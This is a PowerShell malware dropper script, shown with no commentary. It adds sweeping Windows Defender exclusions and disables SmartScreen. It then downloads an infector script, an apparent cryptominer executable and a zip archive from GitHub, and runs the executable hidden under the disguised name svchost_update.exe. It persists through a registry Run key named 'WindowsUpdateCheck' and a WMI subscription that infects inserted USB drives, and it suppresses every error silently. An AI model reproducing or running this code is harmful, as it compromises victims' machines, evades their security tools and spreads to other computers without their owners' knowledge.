Start-Sleep -Seconds 15

$infectorScriptPath = "C:\Windows\Temp\infect.ps1"
$infectorUrl = "https://github.com/NaomiMendoza127/USB/raw/refs/heads/main/infector.ps1"
$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/test.exe"
$payloadPath = "C:\Windows\Temp\svchost_update.exe"
$crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/SystemCore.zip"
$crackedSoftwareZipPath = "C:\Windows\Temp\update_package.zip"
$crackedSoftwareFolder = "C:\Windows\Temp\WindowsServices"
$crackedSoftwareExe = "$crackedSoftwareFolder\SystemCore\ServiceHost.exe"

function Is-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Check and add Windows Defender exclusions first
$maxAttempts = 20
$delayBetweenChecks = 5
for ($i = 0; $i -lt $maxAttempts; $i++) {
    try {
        $defenderService = Get-Service -Name WinDefend -ErrorAction Stop
        $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
        if ($defenderService.Status -eq 'Running' -and $mpStatus.RealTimeProtectionEnabled -eq $true) {
            break
        }
    } catch {
        # Silently continue
    }
    Start-Sleep -Seconds $delayBetweenChecks
}

$exclusionsPaths = @(
    "C:\Users\Public\SystemLib",
    "C:\Windows\Temp\svchost_update.exe",
    "C:\Windows\Temp\WindowsServices",
    "C:\Windows\Temp\update_package.zip",
    "C:\ProgramData\WinKit",
    "C:\Windows\Temp\*",
    "C:\ProgramData\Microsoft\Windows\Temp",
    "C:\Users\*\AppData\Local\Temp",
    "C:\Windows\System32\Tasks",
    "C:\Windows\SysWOW64\Tasks",
    "C:\Program Files\McAfee",
    "C:\Program Files\Symantec",
    "C:\Program Files\Kaspersky Lab",
    "C:\Program Files\Avast Software",
    "C:\Program Files\AVG",
    $infectorScriptPath
)
$exclusionsProcesses = @(
    "svchost_update.exe",
    "ServiceHost.exe",
    "cmd.exe",
    "powershell.exe"
)
$exclusionsExtensions = @(
    "exe",
    "dll",
    "bat",
    "cmd",
    "ps1",
    "vbs",
    "js",
    "zip"
)
foreach ($excl in $exclusionsPaths) {
    try {
        $currentExclusions = Get-MpPreference
        $pathExists = ($currentExclusions.ExclusionPath | Where-Object { $_ -eq $excl }) -ne $null
        if (-not $pathExists) {
            Add-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue
        }
    } catch {
        # Silently continue
    }
}
foreach ($excl in $exclusionsProcesses) {
    try {
        $currentExclusions = Get-MpPreference
        $processExists = ($currentExclusions.ExclusionProcess | Where-Object { $_ -eq $excl }) -ne $null
        if (-not $processExists) {
            Add-MpPreference -ExclusionProcess $excl -ErrorAction SilentlyContinue
        }
    } catch {
        # Silently continue
    }
}
foreach ($excl in $exclusionsExtensions) {
    try {
        $currentExclusions = Get-MpPreference
        $extensionExists = ($currentExclusions.ExclusionExtension | Where-Object { $_ -eq $excl }) -ne $null
        if (-not $extensionExists) {
            Add-MpPreference -ExclusionExtension $excl -ErrorAction SilentlyContinue
        }
    } catch {
        # Silently continue
    }
}

# Check and disable SmartScreen if not already disabled
try {
    $smartScreenPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
    $smartScreenEnabled = Get-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
    if ($smartScreenEnabled -and $smartScreenEnabled.SmartScreenEnabled -ne "Off") {
        Set-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -Value "Off" -ErrorAction Stop
    }
} catch {
    # Silently continue
}

# Download payloads only after exclusions and SmartScreen
$retryCount = 3

# Download infector.ps1 if it doesn't exist
if (-not (Test-Path -Path $infectorScriptPath)) {
    for ($i = 0; $i -lt $retryCount; $i++) {
        try {
            Invoke-WebRequest -Uri $infectorUrl -OutFile $infectorScriptPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
            if (-not (Test-Path -Path $infectorScriptPath)) {
                throw "Downloaded infect.ps1 not found at $infectorScriptPath."
            }
            Unblock-File -Path $infectorScriptPath -ErrorAction Stop
            break
        } catch {
            Start-Sleep -Seconds 2
        }
    }
}

# Download svchost_update.exe if it doesn't exist
if (-not (Test-Path -Path $payloadPath)) {
    for ($i = 0; $i -lt $retryCount; $i++) {
        try {
            Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
            if (-not (Test-Path -Path $payloadPath)) {
                throw "Downloaded file not found at $payloadPath."
            }
            Unblock-File -Path $payloadPath -ErrorAction Stop
            break
        } catch {
            Start-Sleep -Seconds 2
        }
    }
}

# Download and extract WindowsServices if it doesn't exist
if (-not (Test-Path -Path $crackedSoftwareFolder)) {
    for ($i = 0; $i -lt $retryCount; $i++) {
        try {
            Invoke-WebRequest -Uri $crackedSoftwareZipUrl -OutFile $crackedSoftwareZipPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
            if (-not (Test-Path -Path $crackedSoftwareZipPath)) {
                throw "Downloaded zip file not found at $crackedSoftwareZipPath."
            }
            Expand-Archive -Path $crackedSoftwareZipPath -DestinationPath $crackedSoftwareFolder -Force -ErrorAction Stop
            if (-not (Test-Path -Path $crackedSoftwareExe)) {
                throw "Update executable missing."
            }
            Unblock-File -Path "$crackedSoftwareFolder\*" -ErrorAction Stop
            break
        } catch {
            Start-Sleep -Seconds 2
        }
    }
}

# Execute svchost_update.exe if it exists
if (Test-Path -Path $payloadPath) {
    if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -eq ".exe") {
        try {
            Start-Process -FilePath $payloadPath -WindowStyle Hidden -ErrorAction Stop
        } catch {
            # Silently continue
        }
    }
}

# Set up registry persistence
try {
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    $regName = "WindowsUpdateCheck"
    $scriptPath = $PSCommandPath
    $command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
    $regExists = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
    if ($regExists -and $regExists.WindowsUpdateCheck -eq $command) {
        # Registry key already configured
    } else {
        if (-not (Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
        }
        Set-ItemProperty -Path $regPath -Name $regName -Value $command -ErrorAction Stop
    }
} catch {
    # Silently continue
}

# Set up WMI event subscription for USB detection
try {
    $filterName = "USBInsertionFilter"
    $consumerName = "USBInfectionConsumer"

    # Check if WMI filter and consumer already exist
    $existingFilter = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$filterName'"
    $existingConsumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$consumerName'"
    $existingBinding = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__EventFilter.Name='$filterName'"" AND Consumer = ""CommandLineEventConsumer.Name='$consumerName'"""

    if ($existingFilter -and $existingConsumer -and $existingBinding) {
        # WMI subscription already exists
    } else {
        # Remove existing filter, consumer, or binding if they partially exist
        if ($existingBinding) {
            $existingBinding | Remove-WmiObject
        }
        if ($existingFilter) {
            $existingFilter | Remove-WmiObject
        }
        if ($existingConsumer) {
            $existingConsumer | Remove-WmiObject
        }

        # Create WMI event filter
        $query = "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_LogicalDisk' AND TargetInstance.DriveType=2"
        $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
            Name = $filterName
            EventNamespace = "root\cimv2"
            QueryLanguage = "WQL"
            Query = $query
        }

        # Create WMI command line consumer
        $commandLine = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$infectorScriptPath`" -DriveLetter %TargetInstance.DeviceID%"
        $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
            Name = $consumerName
            CommandLineTemplate = $commandLine
        }

        # Bind filter to consumer
        $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
            Filter = $filter
            Consumer = $consumer
        }
    }
} catch {
    # Silently continue
}
